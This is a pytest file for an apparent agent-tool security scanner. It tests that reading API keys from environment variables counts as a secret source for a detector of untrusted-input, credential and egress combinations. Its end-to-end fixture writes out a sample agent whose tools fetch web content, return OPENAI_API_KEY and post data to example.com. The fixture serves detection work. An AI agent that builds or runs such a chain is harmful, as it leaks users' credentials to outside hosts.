"""Reading a credential from the environment must register as a data source.

WHY THIS TEST EXISTS
--------------------
Reading a secret out of the process environment is the single most common way an
agent tool touches a credential — and it produced NO capability at all, in any of
its four syntactic forms (measured 2026-08-05):

    os.environ["OPENAI_API_KEY"]  -> []        os.getenv("K")      -> []
    os.environ.get("K")           -> []        os.environ.items()  -> []

while `open(p).read()` correctly yielded ['read_data', 'file_system'].

That blinded the flagship detector. `aifg.py::_label_for_tool` grants INTERNAL
confidentiality only for READ_DATA or FILE_SYSTEM, and `query_trifecta` requires an
INTERNAL-or-above source for its (S) "secret" leg. So an agent that read
`os.environ["API_KEY"]` and sent it to an egress sink could never complete a
trifecta — the exact exfiltration shape AG-TRIFECTA exists to catch.

Root cause: `os.environ[...]` is a Subscript, not a Call, so the call-signature
tables in `inspect_function_body` could not match it however many entries they had.

SCOPING — this is a correctness boundary, not a noise filter
------------------------------------------------------------
`_label_for_tool`'s rule is "could this return secrets/PII". `LOG_LEVEL` cannot;
`OPENAI_API_KEY` can. Flagging every environment read added 11 witness-less MEDIUM
findings across the benign corpus on ordinary LLM-client wrappers — the
capability-composition class this repo measured at 11% precision. Reads whose key
cannot be inspected (`os.environ.items()`, `dict(os.environ)`, a variable key) fail
CLOSED and are always treated as credential-bearing.
"""
import ast

import pytest

from lucin.models import ToolCapability
from lucin.parsers.body_inspector import inspect_function_body


def _caps(body: str) -> set[str]:
    src = f"def tool_fn(k=None):\n    import os\n    {body}\n"
    fn = next(n for n in ast.walk(ast.parse(src)) if isinstance(n, ast.FunctionDef))
    return {c.value for c in inspect_function_body(fn)}


@pytest.mark.parametrize("body", [
    'return os.environ["OPENAI_API_KEY"]',      # Subscript — the form that was invisible
    'return os.getenv("MY_SECRET")',
    'return os.environ.get("GITHUB_TOKEN")',
    'return os.environ.get("AWS_ACCESS_KEY_ID")',
    'from os import environ; return environ["ANTHROPIC_API_KEY"]',
])
def test_credential_env_read_is_a_data_source(body):
    """Every syntactic form of a credential read must yield READ_DATA."""
    assert ToolCapability.READ_DATA.value in _caps(body), (
        f"{body!r} produced no READ_DATA — the trifecta (S) leg cannot be satisfied, "
        "so credential exfiltration via env is invisible."
    )


@pytest.mark.parametrize("body", [
    'return dict(os.environ.items())',   # bulk: no key to inspect
    'return dict(os.environ)',           # whole-environment copy
    'return os.environ[k]',              # dynamic key: cannot judge
    'return os.getenv(k)',
])
def test_uninspectable_env_read_fails_closed(body):
    """A read we cannot judge is treated as credential-bearing, never as safe."""
    assert ToolCapability.READ_DATA.value in _caps(body), (
        f"{body!r} was treated as safe. A read with no inspectable key must fail "
        "closed — it is the most dangerous form and there is nothing to judge."
    )


@pytest.mark.parametrize("body", [
    'return os.environ["LOG_LEVEL"]',
    'return os.getenv("DEBUG")',
    'return os.environ.get("PORT")',
])
def test_non_credential_env_read_is_not_a_secret_source(body):
    """Config reads must not be labelled secret sources.

    Treating these as credentials is what generated witness-less MEDIUM noise on
    benign LLM wrappers. A tool reading LOG_LEVEL cannot leak a credential.
    """
    assert ToolCapability.READ_DATA.value not in _caps(body), (
        f"{body!r} was labelled a secret source; it cannot return a credential."
    )


def test_trifecta_fires_on_env_secret_exfiltration(tmp_path):
    """End-to-end: the canonical shape AG-TRIFECTA exists to catch.

    untrusted web input (control) + env credential (data) + egress sink.
    Before this fix, `read_secret` had zero capabilities, so the (S) leg was
    unsatisfiable and no trifecta was reported.
    """
    (tmp_path / "agent.py").write_text(
        "import os, requests\n"
        "from langchain.tools import tool\n\n"
        "@tool\n"
        "def read_web(url: str) -> str:\n"
        '    """Fetch untrusted web content."""\n'
        "    return requests.get(url).text\n\n"
        "@tool\n"
        "def read_secret() -> str:\n"
        '    """Read the API key."""\n'
        '    return os.environ["OPENAI_API_KEY"]\n\n'
        "@tool\n"
        "def post_data(payload: str) -> str:\n"
        '    """Send data out."""\n'
        '    return requests.post("https://example.com/c", data=payload).text\n'
    )
    from lucin.scanner import scan_target

    findings = scan_target(tmp_path).findings
    trifecta = [f for f in findings if f.id == "AG-TRIFECTA"]
    assert trifecta, (
        "AG-TRIFECTA did not fire on untrusted-input + env-credential + egress — "
        "the canonical exfiltration shape."
    )
    witness = " ".join(trifecta[0].witness)
    assert "read_secret" in witness, f"witness does not name the secret source: {witness}"
